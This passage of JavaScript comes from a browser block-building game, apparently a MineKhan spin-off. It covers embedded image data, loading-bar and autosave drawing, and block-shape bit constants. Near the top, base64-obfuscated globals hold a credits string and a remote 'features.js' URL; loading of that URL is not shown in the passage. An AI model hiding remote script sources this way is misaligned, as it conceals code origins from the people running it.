aJR3ZEckntcNE+Rd7EHVmohTne7WF4lLvonkOmXvYKW5AQEWWV0NDwA9l5zNcJXhLY+31aKekZ5cTmQpA+ejgShWYnGjn9P5l1uc/dKa3fAAAAAElFTkSuQmCC",
		weather:"data:image/png;base64,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",
		boots:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAANklEQVR42mNgGH5AUkHpPwzjE8OpmRT2qAF4NBPShGEINlMJ2YoiRtAGQmqQEwq+QCJW3RADAP/APi2ukUBkAAAAAElFTkSuQmCC",
		chestplate:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAN0lEQVR42mNgGHRAUkHpPz5MUCOxFmAIkuPSQWQAqYZgVUuxAcQaQjAqh7gBhBQQHdAk5wNKAAAxSTNdTruTUgAAAABJRU5ErkJggg==",
		helmet:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAANUlEQVR42mNgGJ5AUkHpPzZMtGZy5IhTQEjN4DEAPdCQ+bR1AcWxQBUDcCkkWjOu1Dh48w0AqK8rQTGnXTwAAAAASUVORK5CYII=",
		leggings:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAALUlEQVR42mNgGHRAUkHpPz5MUDMxFgwhA7D5m2gDiGGPGjBoDcCW7knKD6QCAIIkSP0hTX9DAAAAAElFTkSuQmCC",
		//Actually offhand//shield:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAbUlEQVQ4y62TURJAEQhF24Y/Y/97zI/e1JXk0Uw/6h4XIWammwyLpTYeGQN0KBE7INNsHHgNpbYvcQPjQGxmQzQTIAvxAEcu9MW+AejF3wApZMTTMz4F7I6xA4QQrK0A5g/AeFMIwPFF4RJwkx12yiHWwRBgCAAAAABJRU5ErkJggg==",
		elytra:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAGFJREFUOE9jZKAQMFKonwHDAEkFpf/4DH3+4B6KHjgHphGmAN0gdHEYH2wASDG6ychi+ORHDbjHSJ0wwBYT+GIBWQ4lHSBHJckGILsCX7yjy6EkS/TUiJ6ksclTPzORmjsBcJ+oEcgNm4wAAAAASUVORK5CYII=",
    //minekhan: "assets/images/minekhan.png",
    panorama: "assets/images/panorama/aug-26-2024.jpg",
		loadbar: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAoAAAAAICAYAAABpsU6/AAAABGdBTUEAALGPC/xhBQAAAPpJREFUeNrt20EOgjAQBVCa9P5XRo0rkYUSOmln3iybSPiPoS2ibX/W9lltU6/iwoULFy5cuPBK6dIB/p2TCxcTCxcuXLjwWtqlAy/fiK7nWJdsvly4mF/0C68ELl8bwNbenz++Gf5hfD+Mt4vHCR2/Mf+S4wH5p+6L4w20St8GXP8SLhf6P5XLQvP/kOOb/6Zb/0K9Zsp/dm6jXa58A+gJRX6Vpy9m608u+la/5O9f99fJZi/6PxldA8gvPxfe03tHn6c+5MIruUtfCKb6bx3kt2GW30Jyt0tWVy6xucxPC65bvSD8Xrzx5JdffguSDfN52bjUehAvnf8Ba86fI1AtGCgAAAAASUVORK5CYII=",
		autosave:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKIAAAAeCAYAAACv+sUVAAADdUlEQVR42u3av2sTYRzH8XfONOkPqrGl1F8VXRqklFIcxKGDm0Na0KlQaSeRjgrqvyAKdtOhk6KlFLFgOwm6ODk4FAdJHULpYGtKGikmJqk5hyNHr7m73B1PW5N8vxBIk+PVb57nc7nn7hLCoRKJMd3u9eXldyGkpGqU3/yE3bCll7ctf49Ozh54Q1L1FSBV+QkfxoeTQDdugFRVuJ4GuxEDXe8BasogNmqg6zlAEsQGCbSUUZoMgZQEUUrK7tDstO5x2kbOWKVU5Sdca93j9J7bekgC3TwBUpWf8P4zvtFJdDesgtQKjwS6OQKkKj9hv5iXEEqgmydAqvITchsIu8sTfibJzvBruRleLS+GF2t/gGpdvnFzVPSjanxUzpfK/FgwPbOk65kl3cteXMsIatkZfi03w6vlxVBpqfhsKsZaxdwHNQB0QE8kxipI5eHbsWlIb+ZA/+cBUjJffvMTcgCYme7jXCxmvlgoFAG49TRZ87Bu57z4ehGA8f5kYOfD+rB5OBydnGW8P+nbSSTGcDhkeHbsDBvr0PpROT4q58tPfkL7gVf34qTzObq1CABtx9st/6VQKJLO57j7fN2psQN1FtYGAJgaTAV2FtYGLBM2NZjy7eyd9L0BGu9PHkk/KsfnKOa9gukz0330tLXbRjydz5nvRaMRM917wLpz5lfjlj0+iDO/Gq/6BjrKfup5vkzodG8XAA9udlSB5cIuWjRsPgd4+GYbgB+bGUtDzebsD5CMTzDHhK4PdQKwstFigoCJpvM5AB6//Q3AjSHjNvWz91uWhsQRJ4hTleihUyUL+GSih3Q+VwUsrpRd9wxxxPHjmHdWznf9BeDC1QlGRkbIPboDwP3XaVvgWr+xGJ3btK4HxBEniGMG8WTE2CCVSpHNZvn+09hwuC/E5o7G4spfC9AVs/9NrTjiBHGq1K2tLQDOxI5VlpoWINa2S1lroVz443oxSRxx/DiWIGotEXpKq7CxSm9nxLJhrM0429GirWhAuVBybEYccfw6ZhC3ixoUd+nuiFAuFSmXiiZuPRU3kpzdLds2I444QZxKEEOfv/3SAa5cOgFo5jHfkvhoK5mskey5Txt2V9jFESeQ43iv2QChuyPM5o5G/Kyx2Jz7mPF1z1Eccbw4oVrg5XgPAF+Saa+NiCOOSscCBv4tmTjieHH+ASOfDpJpNy6QAAAAAElFTkSuQmCC",
    error:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAAXNSR0IArs4c6QAAABhJREFUGFdj/M/w/z8jAwgyMPz/z/CfAQA5DAX/rY1o3wAAAABJRU5ErkJggg==",
		//categoryNature:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAHRSURBVHjarJTPaxNBGIafb5PpLrHbJDWwVQhU66kggVx68tKe68GzZ0HQm3+G/heCFL17KgiCxxQvLRQPwR66SynJZlOZZEjGQ7I/0gQv9bsM883s+z3vy7BireWu5fAfqvyvQxGxgFhrERGAldhStCMipHsRsfHIoepOKQjZN1/2Cdbq/Lr+TaPR4MPh15wknVoU2FibEI9KVN2plTmKf6Q5DU/Z3qoDcZ6JiNiX79sAdk4jVXfKYFzKSIr491sHi8GKCPHIkY/vOhSELMCLt4+X/HfDHn7UIQnadMNeRmKr7tQCXJ4PADh49eT2tzYNdWYDDh/08yyBpbCGwyFKqZW93W8eF1E/o/r0/WwWrH+k+cMlD1EkwQ6bUQeYZAEmwQ6Dn8c8az3iIurTDXuzXMLjPNjUWzOo4UedDDNFT3spwfZWfeGekzabQS2bklYzqJEE7QXBZlBbGlIG2H3+GoCWUrQAYwwASin2jAH2UEoBcHJyRuVpmXuVDW5uEvj8Y0ailML3/WzCqj2A53lUKh6lkjAej3EcldvxPI/bq9Z6SUBrjSo7CC7r65sYM8lFtNYkSQJzK1prjDGZreI6NgZxYq6uIjxvkL+Tu/4K/g4AUIbMBSA3XfYAAAAASUVORK5CYII=",
		//categoryItems:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAGZSURBVHjapJQxa9tAGIafc00tbyG0SymlWowJZAjV/QD/BEM7d+ngdumYNf+iS8gW8JA5q5Ipg11c8GI81KXdfLSxDwtbwebLojtsWTaUfHAgvTqe97u796REhKdWOS8opQRARJRSil0mbl5RiTFGjDECuLFz7sP1GwGklAMA0O/3Oa/VOK/V2Af7evFyYzkbgJ+tFov5nMVi4UB8Gg4dSDnI4Nc/D9kJAJjc3xMEQRGMFwdVTxVjTCEgX0EQEFSrDub1Z8DZarVi2GrxMJsxTxKeVyqFkOVy6Q3q1nKX6SWA+e9belHINE2ZpimJtSTWFoISa/k7HtOLQq/504m7I3pRuBeWWMs0Tbk5fkX97SEuT2WAb1ffPQiAzOXEvWegaZrSi0Li7shD1o9LtNZe7HQ6ADRyMAfYSJzrRGuNHF36D83Xp0z+/FBxdyTrncXdESKiAL58iLYjrLWWZrMp0cehT2gjCt3dkc/v3wkgjbUNzTpZfxYZDAbSbrc3Yp6HbLmLbN/iXeU2v6gDJSIopci5q//5nzwOAHXDBIFXboMnAAAAAElFTkSuQmCC",
		//categoryTools:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAFmSURBVHjanJS9SgNBFEbPhCALYsAigbVYU7hYhK2CQirRB7ATe0Ui+wBJlQdIHiC4+ARCKpvUaXZhg5BWYqFpBDdVQAg210J32M2PSfxgipm5c+535w6jDLvIIm3tFVimSS+UxFRl2FCTXijlqE8p6Oi1zH8A05c3jIP9zSGzgKf8EYBaG/IXYC3IKoCIkI0n0+FrfOMq7tgqQO7keN5J/voCQKbD17UBABh2kcRbEatVF0DKUV9KQUfKUV+AZSNdTlKGXdQOvs6u8H1/LmYwGOC6riillK7/dPeTbhjFbvi4f8A2dvA8j0qlAkAQBCkIgOu6c92R23OLUa1J4eYytbEIEEuX0w0jaVYPqXvPAGpUa4rjOBpQrVb1ofF4TKPRSGf/daAvK7nn+744jiNWzkgN0zSl3W4LIBkAq1Xn7nGUauEmygKMas10evkxpJTS9t8n01SMuZ34C2apMSABkSWxev17ACRnxMv4aVvaAAAAAElFTkSuQmCC",
		//categoryConstruction:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAARCAYAAAA7bUf6AAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAEdSURBVHjalJOhTgNBEIa/IWd4AyRBkSAQkBIEstTxAg2OZ0AVd6rPcK49gT1HViKaNK3AVV5dFQJDUIOgc73du2uXUXuTzLf//8+eqCoAIqIAqioigvVjKjFAPhx4MBGRWFBih+/LOwDy7fcwf9OtIomGlK4A4LT/4MHqNg9C6lW64l+wCmJDscqAKjNRVURER/2eN2SQ8JLjj3fLrFKVtFnpgpWu4OfsgoN2bMhyCW1uFrMG5Kh+S9ug9dtyi95OaPPk+vavsVw1IJK6uQJkga3Q5mYx24FCJZa0rdC2FcLWr9N2O/V/JBunAvD0PPJgBgxVeA+mq0xZNk4pXcH68wuAyXK1U2+Ql/ubvTDL7PHqvBuyR0nYajz73wEADsipFjE4Vi8AAAAASUVORK5CYII=",
		//worldIcon:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAARCAYAAADUryzEAAAAAklEQVR4AewaftIAAAG0SURBVLXBQUhTYQDA8f83p/HGHDwow5wQKTT0UMfyHezSg6BD9ewSdurWYR67BK1ZB496kCDq0qFLzy56GUGMmDMjNl2bLygvKyUSHrnizVJe+2JfPMYQPPj7caiy5ZKfLZd89iFo49pU0adh4nIH0vT8HtLcnbOCFoKA5NKYT4DVfY/p+T2kVe0GyqdkRdAkaEgujfm0+JK9ixIffUA7M+deiA4atsSt1FZkmf6j3QxrffR0xhgcLPKmPkotdoSv7kV+/LnKhWNFejpjPHpWZe1Dndrb9fthAhadDRbZYCRxgsq3WaJR/hk6fpthrY/HhXesP7+CliijhGjh5iwWnpzn+9p7TsUjXD/5ECn9tMxmIYKWyOA5JkqYJjdnoRs2ys/PFVb7T7OwXKYdzzGBV4QIcHMWumET5Dkm+wkRoBs2km7Y6IaNV/2I5DkmiueYdPWuoIQ4oK7eFX5vnkEJ07Dj/UJycxa6YSO5OYvoAP95jomyW6+hCALi42k/NjLHTuEmUnRgiOrrEspuvYa0nZ0UNAnaiI+nfRpeTlwik8kgTWXqbGcnBQeRz+f9VCrlc5j+AmTYl6HuWT1sAAAAAElFTkSuQmCC"
  };window[atob("YmFzZTY0")] = "VGhpcyBwcm9ncmFtIGlzIGEgc3Bpbi1vZmY8YnI+b2YgPGEgaHJlZj0naHR0cHM6Ly93aWxsYXJkLmZ1bi9taW5la2hhbicgdGFyZ2V0PSdfbmV3Jz5NaW5lS2hhbjwvYT4gYnkgV2lsbGFyZC48YnI+TW9zdCBvZiB0aGUgYWRkZWQgZmVhdHVyZXMgYXJlIGJ5PGJyPnRoaW5nTWFrZXIgKGtub3duIGFzIDItcGVvcGxlIG9uIE1pbmVLaGFuKTxicj5UbyBzZWUgY3JlZGl0cywgY2xpY2sgSGVscCAocXVlc3Rpb24gbWFyayBidXR0b24pLg==";
		window[atob("ZmVhdGVy")]="aHR0cHM6Ly90aGluZ21ha2VyLnVzLmV1Lm9yZy9taW5la2hhbi9mZWF0dXJlcy5qcw=="
  let crossOriginImages = ["panorama"]
  function loadImage(i,images){
		return new Promise((resolve,reject) => {
			var url = images[i]
			images[i] = new Image()
			images[i].src = url
			images[i].onload = () => {
				resolve()
			}
			images[i].onerror = err => {
				images[i].broken = true
				reject(err)
			}
			if(crossOriginImages.includes(i)){
				images[i].crossOrigin = ""
			}
		})
  }
	function loadOriginalImage(i){
		let url = images[i]
		loadImage(i,images).then(r => loadDone("Loaded "+i)).catch(r => loadDone("Failed to load "+i,"fail"))
	}
  for(var i in images){
    loadOriginalImage(i)
  }
  win.images = images
	function imageHtoW(h,image){
		image = customResources.images[image] || images[image]
    if(!image || !image.complete || image.broken) image = images.error
		return h*image.naturalWidth/image.naturalHeight
	}
  function drawImage(image){
    image = customResources.images[image] || images[image]
    if(!image || !image.complete || image.broken) image = images.error
    arguments[0] = image
    ctx.drawImage(...arguments)
  }
  win.drawImage = drawImage
	let loadingBarAmount = 0, loadingBarDir = 64, lastLoadBar = 0
	function drawLoadBar(x,y,slow=1){
		y -= 8
		x -= 64
		if(now - lastLoadBar > 15*slow){
			lastLoadBar = now
			loadingBarAmount += loadingBarDir
			if(loadingBarAmount <= 0 || loadingBarAmount >= images.loadbar.width - 64) loadingBarDir = -loadingBarDir
		}
		drawImage("loadbar", round(loadingBarAmount/64)*64,0,64,8, x,y,128,16)
	}
	let autosaveIconAmount = 0, lastAutosaveIcon = 0
	let lastAutosave = 0, autosaveTimer = null, saving = false
	function drawAutosave(x,y){
		y -= 30
		x -= 18
		if(now - lastAutosaveIcon > 100){
			lastAutosaveIcon = now
			autosaveIconAmount += 18
			if(autosaveIconAmount >= images.autosave.width) autosaveIconAmount = 0
		}
		drawImage("autosave", round(autosaveIconAmount/18)*18,0,18,30, x,y,36,60)
	}
	let progressBarSize
	function drawProgressBar(x,y,amount){
		amount = round(amount*32) || 0
		let stuff = "["+"#".repeat(abs(amount))+"-".repeat(abs(32-amount))+"]"
		if(!progressBarSize){
			ctx.font = "16px monospace"
			progressBarSize = ctx.measureText("-".repeat(34)).width
		}
		let size = (width*0.4/progressBarSize*16)
		ctx.font = size+"px monospace"
		ctx.fillStyle = "white"
		ctx.textAlign = "left"
		ctx.fillText(stuff,x - width*0.2,y)
	}

	let armorSlots = ["helmet",'chestplate','leggings','boots','elytra']
  
  let audioCtx, listener
  
	let CUBE,SLAB,STAIR,CROSS,TALLCROSS,DOOR,TORCH,LANTERN,LANTERNHANG,BEACON,
      CACTUS,PANE,PORTAL,WALLFLAT,TRAPDOOR,TRAPDOOROPEN,FENCE,WALLPOST,
      BUTTON,CHAIN,POT,POTCROSS,CORNERSTAIRIN,CORNERSTAIROUT,VERTICALSLAB,
			//if you change this, change debugStick and server side
      LAYER1,LAYER2,LAYER3,LAYER4,LAYER5,LAYER6,LAYER7,LAYER8,
	    FLIP,NORTH,SOUTH,EAST,WEST,ROTATION// Mask for the direction bits
  let isCube, isState
  let prevConstVersion = null
  
  /*var curConst = 0
  function nextConst(rotate, flip){
    var n = 1
    if(rotate) n = 4
    if(flip) n = 8
    var p=curConst
    curConst += n*500
    return p
  }*/
  function verMoreThan(a,b){
    a = a.split(".").map(r => parseInt(r))
    b = b.split(".").map(r => parseInt(r))
    if(a[0] > b[0]) return true
    if(a[1] > b[1] && a[0] === b[0]) return true
    if(a[2] > b[2] && a[1] === b[1]) return true
  }
	function bin(n){
		return parseInt(n,2)
	}
  function constVersion(v){
    if(v === prevConstVersion) return
    prevConstVersion = v
    isCube = 0xff
    //let verNum = v.replace(/(Alpha|Beta) /, '')//.replace(/(?<=\..*)\./g, '') //second regex removes the periods after the first
    //if(verMoreThan(verNum, "1.0.3") || verNum==="1.0.3"){
CUBE = 0
LAYER2=SLAB =          0b10000000000000 // 9th bit
LAYER3=STAIR =        0b100000000000000 // 10th bit
LAYER4=CROSS =        0b110000000000000
LAYER5=TALLCROSS =0b1001110000000000000
LAYER6=LANTERN =    0b10010000000000000
LAYER7=LANTERNHANG=0b100010000000000000
BEACON =           0b100110000000000000
CACTUS =           0b101000000000000000
POT =              0b101010000000000000
POTCROSS =         0b101110000000000000
LAYER1 = TORCH =   0b110000000000000000
CHAIN =            0b110010000000000000
LAYER8 = DOOR =   0b1000010000000000000
PORTAL =          0b1000100000000000000
WALLFLAT =        0b1000110000000000000
PANE =           0b10001000000000000000
TRAPDOOR =        0b1010000000000000000
TRAPDOOROPEN =   0b10000000000000000000
FENCE =          0b11000000000000000000
WALLPOST =       0b11000100000000000000
//WALL = 0x6400<<5
//WALLU = 0x6600<<5 //wall withe exteion under another wall
//FENCQ = 0x4100<<5 //fence (one extension)
BUTTON =         0b10000100000000000000
//CARPET    =      0b10000110000000000000
CORNERSTAIRIN =      0b1000000000000000
CORNERSTAIROUT =     0b1010000000000000
VERTICALSLAB =       0b1100000000000000
FLIP      =               0b10000000000 // 11th bit
NORTH = 0 // 12th and 13th bits for the 4 directions
SOUTH =                  0b100000000000
EAST =                  0b1000000000000
WEST =                  0b1100000000000
ROTATION =              0b1100000000000 // Mask for the direction bits
isCube =                   0b1111111111 // Mask for block id bits
isState =        0b11111110000000000000
    /*}else if(verMoreThan(verNum, "1.0.0") || verNum === "1.0.0"){
CUBE = 0
LAYER2 = SLAB = 0x100 // 9th bit
LAYER3 = STAIR = 0x200 // 10th bit
LAYER4 = CROSS = 0x300
FLIP = 0x400 // 11th bit
LAYER5 = TALLCROSS = 0x700
LAYER6 = LANTERN = 0x900
LAYER7 = LANTERNHANG=0x1100
BEACON = 0x1300
CACTUS = 0x1400
POT = 0x1500
POTCROSS = 0x1700
LAYER1 = TORCH = 0x1800
CHAIN = 0x1900
LAYER8 = DOOR = 0x2100
PORTAL = 0x2200
WALLFLAT = 0x2300
PANE = 0x4400
TRAPDOOR = 0x2800
TRAPDOOROPEN=0x4000
FENCE = 0x6000
WALLPOST = 0x6200
//WALL = 0x6400
//WALLU = 0x6600 //wall withe exteion under another wall
//FENCQ = 0x4100 //fence (one extension)
BUTTON = 0x4200
CARPET    = 0x4300
FLIP      = 0x400 // 11th bit
NORTH = 0 // 12th and 13th bits for the 4 directions
SOUTH = 0x800
EAST = 0x1000
WEST = 0x1800
ROTATION = 0x1800 // Mask for the direction bits
    }else{
      CUBE      = 0
      LAYER2 = SLAB      = 0x100 // 9th bit
      LAYER3 = STAIR     = 0x200 // 10th bit
      LAYER4 = CROSS     = 0x2000
      LAYER5 = TALLCROSS = 0x2200
      LAYER8 = DOOR      = 0x2400
      LAYER1 = TORCH     = 0x2600
      LAYER6 = LANTERN   = 0x2800
      LAYER7 = LANTERNHANG=0x3000
      BEACON    = 0x4200
      CACTUS    = 0x4400
      PANE      = 0x4600
      PORTAL    = 0x5000
      WALLFLAT  = 0x4800
      TRAPDOOR  = 0x5200
      TRAPDOOROPEN=0x5400
      FENCE     = 0x6000
      WALLPOST  = 0x6200
      //WALL      = 0x6400
      //WALLU     = 0x6600 //wall withe exteion under another wall
      //FENCQ     = 0x6800 //fence (one extension)
      BUTTON    = 0x7000
      CHAIN     = 0x7200
      POT       = 0x8000
      POTCROSS  = 0x8200
      CARPET    = 0x8400
      FLIP      = 0x400 // 11th bit
      NORTH     = 0 // 12th and 13th bits for the 4 directions
      SOUTH     = 0x800
      EAST      = 0x1000
      WEST      = 0x1800
      ROTATION  = 0x1800 // Mask for the direction bits
    }*/
  }
	constVersion(version)
	let blockMode   = CUBE
  win.changeBlockMode = m => blockMode = m
  function cycleBlockShapes(){
		if(!cheats) return blockMode = CUBE
    blockMode = blockMode === CUBE ? SLAB : (
      blockMode === SLAB ? VERTICALSLAB : (
        blockMode === VERTICALSLAB ? STAIR : (
          blockMode === STAIR ? FENCE : (
            blockMode === FENCE ? WALLPOST : CUBE
					))))
    inventory.showName = 3
    updateHUD = true
  }

	let tex
	let textureAtlas, textAtlas
	let textureMap
	let dirtBuffer
	let dirtTexture, netherTexture, endTexture, panoramaTexture, endPortalTexture, weatherTexture, avgBrightnessResultTexture, avgBrightnessCanvasTexture, shadowMapTexture, defaultSkinTexture
	let textureCoords
	let texCoordsBuffers
	let mainbg, dirtbg, netherbg, endbg // Background images
	let avgBrightnessPositionBuffer, updateAvgBrightnessBuffer, avgBrightnessFB, avgBrightnessPixels = new Uint8Array(4), shadowMapFB
	const shadowMapSize = 512
	let bigArray = win.bigArray || new Float32Array(6000000)
	win.bigArray = bigArray

	window.message = doc.createElement("p")
	window.message.className = "hidden darklinks"
	window.message.style = "position: absolute; top: 10px; right: 10px; z-index: 1; text-align: right; background-color: rgba(255, 255, 255, 0.3);"
	doc.body.appendChild(message)
	
	let creationMenuScrollable = createScrollable(), inventoryScrollable = createScrollable(), optionsScrollable = createScrollable()
	
	// Callback functions for all the screens; will define them further down the page
	let thisSceneCurrent = true
	let drawScreens = {}
	let autoDrawScreens = ["play", "loading", "netherLoading", "endLoading", "dead","temporary dead", "chat", "edit sign", "sleep", "endPoem", "custom menu", "multiplayer connecting","downloading","commandBlock","loadingResources","packetViewer raw","packetViewer json","multiplayer disconnecting","inventory","crafting","furnace","chest","anvil","dispenser","hopper"]
	let html = {
    initLoading:{
      enter:[window.loader],
      onexit: () => {
				if(performFast){
					loader.classList.add("hidden")
				}else{
					loader.style.opacity = 0
					//loader.style.transform = "translateX(100vw)rotate(90deg)translateX(-100vw)"
					setTimeout(() => {
						loader.style.opacity = 1
						loader.classList.add("hidden")
					},500)
				}
      }
    },
		pause: {
			enter: [window.message],
			exit: [window.savebox, window.saveDirections, window.message]
		},
		"loadsave menu": {
			enter: [window.worlds, window.boxCenterTop, window.uploadWorld, window.quota],
			exit: [window.worlds, window.boxCenterTop, window.uploadWorld, window.quota],
			onenter: () => {
				window.boxCenterTop.placeholder = "Enter Save String (Optional)"
